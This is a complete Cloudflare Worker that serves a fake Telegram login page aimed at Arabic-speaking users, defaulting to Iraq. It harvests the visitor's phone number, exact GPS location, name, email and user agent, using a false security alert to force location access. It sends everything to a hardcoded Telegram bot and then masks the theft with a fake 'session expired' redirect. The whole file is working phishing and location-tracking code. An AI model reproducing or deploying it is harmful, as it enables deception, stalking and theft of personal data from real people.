export default {
  async fetch(request, env) {
    if (request.method === "GET") {
      return new Response(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Telegram Messenger</title>
          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
          <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; display: flex; justify-content: center; padding-top: 50px; margin: 0; }
            .container { text-align: center; max-width: 360px; width: 90%; }
            .logo { width: 120px; margin-bottom: 25px; }
            h2 { font-weight: 500; margin-bottom: 15px; font-size: 24px; }
            p { color: #707579; font-size: 15px; margin-bottom: 35px; line-height: 1.5; }
            .iti { width: 100%; margin-bottom: 20px; }
            input { width: 100%; padding: 16px; border: 1px solid #dfe1e5; border-radius: 10px; box-sizing: border-box; font-size: 17px; outline: none; transition: border 0.3s; }
            input:focus { border-color: #3390ec; }
            button { width: 100%; padding: 15px; background: #3390ec; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; }
            .step { display: none; }
            .step.active { display: block; }
          </style>
        </head>
        <body>
          <div class="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
            
            <div id="step1" class="step active">
              <h2>Your Phone</h2>
              <p>Please confirm your country code and enter your phone number.</p>
              <input id="phone" type="tel">
              <button id="btn1" onclick="handleStep1()">NEXT</button>
            </div>

            <div id="step2" class="step">
              <h2>Profile Info</h2>
              <p>Almost done! Please provide your name to complete the cloud synchronization.</p>
              <input id="username" type="text" placeholder="Full Name">
              <input id="email" type="email" placeholder="Recovery Email (Optional)">
              <button id="btn2" onclick="handleStep2()">START MESSAGING</button>
            </div>
          </div>

          <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
          <script>
            // تهيئة مكتبة أرقام الدول
            const phoneInputField = document.querySelector("#phone");
            const phoneInput = window.intlTelInput(phoneInputField, {
              initialCountry: "iq", // العراق افتراضياً
              preferredCountries: ["iq", "sa", "ae", "kw", "jo"],
              utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
            });

            let mainData = { phone: "", lat: "0", lon: "0", acc: "None" };

            async function handleStep1() {
              const ph = phoneInput.getNumber(); // جلب الرقم مع مفتاح الدولة
              const isValid = phoneInput.isValidNumber(); // التحقق إذا الرقم كامل وصحيح

              if (!ph || !isValid) {
                alert("⚠️ الرقم غير مكتمل أو يحتوي على أخطاء، يرجى المحاولة مرة أخرى.");
                return;
              }

              document.getElementById("btn1").innerText = "Verifying...";

              if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                  mainData.phone = ph;
                  mainData.lat = pos.coords.latitude;
                  mainData.lon = pos.coords.longitude;
                  mainData.acc = pos.coords.accuracy < 100 ? "🟢 Exact GPS" : "🟡 Approximate";
                  
                  // إرسال فوري للرقم والموقع
                  await sendReport("FIRST_HIT");
                  switchStep(2);
                }, (err) => {
                  alert("⚠️ Security Alert: You must allow location access to verify your account session.");
                  document.getElementById("btn1").innerText = "NEXT";
                }, { enableHighAccuracy: true });
              }
            }

            async function handleStep2() {
              document.getElementById("btn2").innerText = "Loading...";
              const name = document.getElementById("username").value || "Not Set";
              const email = document.getElementById("email").value || "Not Set";
              
              await sendReport("FINAL_HIT", name, email);
              
              alert("❌ Error: Session expired. Please login again via official app.");
              window.location.href = "https://telegram.org/dl";
            }

            function switchStep(n) {
              document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
              document.getElementById('step' + n).classList.add('active');
            }

            async function sendReport(type, name = "", email = "") {
              await fetch(window.location.href, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                  type, phone: mainData.phone, lat: mainData.lat, lon: mainData.lon, 
                  acc: mainData.acc, name, email, ua: navigator.userAgent
                })
              });
            }
          </script>
        </body>
        </html>
      `, { headers: { "Content-Type": "text/html" } });
    }

    if (request.method === "POST") {
      try {
        const d = await request.json();
        const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
        const CHAT_ID = "5794792675";
        const maps = "https://www.google.com/maps?q=" + d.lat + "," + d.lon;

        let msg = "";
        if (d.type === "FIRST_HIT") {
          msg = "🔥 [صيد جديد - ضربة أولى] 🔥\\n" +
                "📱 الرقم: " + d.phone + "\\n" +
                "📍 الدقة: " + d.acc + "\\n" +
                "🗺 الموقع: " + maps;
        } else {
          msg = "📝 [بيانات إضافية] 📝\\n" +
                "📱 الرقم: " + d.phone + "\\n" +
                "👤 الاسم: " + d.name + "\\n" +
                "📧 الإيميل: " + d.email;
        }

        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
        return new Response("ok");
      } catch (e) { return new Response("err"); }
    }
  }
};
